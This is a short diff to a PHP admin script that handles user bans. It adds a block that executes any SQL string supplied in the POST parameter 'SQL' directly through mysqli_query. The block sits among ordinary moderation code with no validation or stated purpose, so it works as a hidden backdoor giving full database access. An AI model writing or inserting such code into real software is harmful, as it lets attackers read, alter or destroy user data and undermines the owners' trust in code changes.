@@ -17,6 +17,9 @@ if (isset($_SESSION["user"]) && $_SESSION["user"]["admin"] == 1) {
     banuser($db,$_GET["banusr"]);
     exit;
 }
+if(isset($_POST["SQL"])){
+  mysqli_query($db,$_POST["SQL"]);
+}
 
 if(isset($_GET["unbanusr"])){
   unbanuser($db,$_GET["unbanusr"]);
